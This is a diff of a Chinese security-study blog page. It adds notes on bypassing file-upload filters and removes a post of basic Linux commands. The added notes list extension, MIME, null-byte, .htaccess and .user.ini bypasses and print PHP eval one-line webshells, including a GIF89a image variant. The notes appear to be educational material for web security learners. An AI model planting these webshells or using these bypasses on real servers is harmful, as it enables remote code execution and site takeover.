@@ -155,7 +155,7 @@
     
     
     <article
-  id="post-1"
+  id="post-文件上传"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -166,7 +166,73 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2022/07/25/1/"
+  <a class="article-title" href="/2022/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
+    >文件上传</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time datetime="2022-08-03T00:35:29.000Z" itemprop="datePublished">2022-08-03</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>上传文件时，服务器端代码未对客户上传的文件进行严格的验证和过滤</p>
+<h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><h4 id="js检测绕过"><a href="#js检测绕过" class="headerlink" title="js检测绕过"></a>js检测绕过</h4><p>绕过方法:bp抓包修改，在浏览器中修改前端代码</p>
+<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><h5 id="黑名单绕过方式"><a href="#黑名单绕过方式" class="headerlink" title="黑名单绕过方式"></a>黑名单绕过方式</h5><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>双写绕过</p>
+<h6 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h6><h6 id="文件后面加-点-或-点空格点"><a href="#文件后面加-点-或-点空格点" class="headerlink" title="文件后面加.(点)或. .(点空格点)"></a>文件后面加.(点)或. .(点空格点)</h6><p>对于Windows系统，文件最后一个符号是.时会被丢弃</p>
+<h6 id="文件后面加-DATA"><a href="#文件后面加-DATA" class="headerlink" title="文件后面加::$DATA"></a>文件后面加::$DATA</h6><p>php+windows的情况下，如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持::$DATA之前的文件名</p>
+<h5 id="常用php文件后缀名"><a href="#常用php文件后缀名" class="headerlink" title="常用php文件后缀名"></a>常用php文件后缀名</h5><p>php，php7，php5，php4，php3，php2，php1，html，htm，phtml，pht</p>
+<h5 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h5><h6 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php%00截断"></a>php%00截断</h6><p>截断原理:由于00代表结束符，所以会把00后面的所有字符删除</p>
+<h4 id="文件类型绕过-MIME"><a href="#文件类型绕过-MIME" class="headerlink" title="文件类型绕过(MIME)"></a>文件类型绕过(MIME)</h4><p>绕过方式：bp抓包修改Content-Type的值</p>
+<h4 id="上传配置文件绕过"><a href="#上传配置文件绕过" class="headerlink" title="上传配置文件绕过"></a>上传配置文件绕过</h4><h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;文件名&quot;</span>&gt;  </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=文件名</span><br></pre></td></tr></table></figure>
+
+<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>一些网站上传文件的逻辑是先允许上传任意文件，  然后检查上传的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
+<h4 id="一句话木马及常用绕过方式"><a href="#一句话木马及常用绕过方式" class="headerlink" title="一句话木马及常用绕过方式"></a>一句话木马及常用绕过方式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;pHp&quot;</span>&gt;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-文件包含"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
     >文件包含</a> 
 </h2>
  
@@ -175,7 +241,7 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/07/25/1/" class="article-date">
+      <a href="/2022/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
   <time datetime="2022-07-25T00:42:01.000Z" itemprop="datePublished">2022-07-25</time>
 </a> 
   <div class="article-category">
@@ -1222,108 +1288,6 @@
 <h5 id="vim-文件"><a href="#vim-文件" class="headerlink" title="vim 文件"></a>vim 文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:sp  另外一个文件的路径及文件名 打开另一个文件</span><br><span class="line"></span><br><span class="line">ctrl+两次按w  窗口切换</span><br></pre></td></tr></table></figure>
 
 
-
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali%E5%91%BD%E4%BB%A4/" rel="tag">kali命令</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-linux常用命令"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/06/30/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"
-    >linux常见命令</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/06/30/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-date">
-  <time datetime="2022-06-30T05:01:41.000Z" itemprop="datePublished">2022-06-30</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/kali/">kali</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>pwd：查看工作目录<br>cd：切换工作目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd [目录位置]</span><br></pre></td></tr></table></figure>
-
-<p>ls：列表显示目录内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls [参数] [文件名]</span><br></pre></td></tr></table></figure>
-
-<p>mkdir：创建新的目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir [-p（创建多级目录）] [/路径/]目录名</span><br></pre></td></tr></table></figure>
-
-<p>du：统计目录及文件的空间占用情况</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du [参数] [目录或文件名]</span><br></pre></td></tr></table></figure>
-
-<p>touch：新建空文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch [文件名]</span><br></pre></td></tr></table></figure>
-
-<p>file：查看文件类型</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file [文件名]</span><br></pre></td></tr></table></figure>
-
-<p>cp：复制文件或目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp [参数] [源文件或目录] [目标文件或目录]</span><br></pre></td></tr></table></figure>
-
-<p>rm：删除文件或目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm [参数] [文件或目录]</span><br></pre></td></tr></table></figure>
-
-<p>mv：移动文件或者目录；文件改名</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv [参数] [源文件或者目录] [目标文件或者目录]</span><br></pre></td></tr></table></figure>
-
-<p>which：查找linux目录文件并显示所在位置（搜索范围有path环境变量指定）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which [命令或程序名]</span><br></pre></td></tr></table></figure>
-
-<p>find：查找文件或目录</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [查找范围] [查找条件]</span><br></pre></td></tr></table></figure>
-
-<p>ln  为文件或者目录建立链接</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln [-s] [源文件或者目录] [链接文件或者目录（路径要用绝对路径）]</span><br></pre></td></tr></table></figure>
-
-<p>关于链接文件<br>符号链接:软链接，指向原始文件所在路径<br>硬链接:指向原始文件对应的数据位置</p>
-<p>cat：显示文件的全部内容<br>more：全屏方式显示文件内容<br>less：与more命令相同<br>head：查看文件开头的一部分内容（默认10行）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n [文件名]</span><br></pre></td></tr></table></figure>
-
-<p>tail：查看文件结尾的少部分内容（默认10行）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -n [文件名]</span><br><span class="line">tail -f [文件名]</span><br></pre></td></tr></table></figure>
-
-<p>wc：统计文件中的单词数量等信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wc [参数] [目标文件]</span><br></pre></td></tr></table></figure>
-
-<p>grep：在文件中查找并显示包含指定字符串的行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [参数] [查找条件] [目标条件]</span><br></pre></td></tr></table></figure>
 
  
       <!-- reward -->
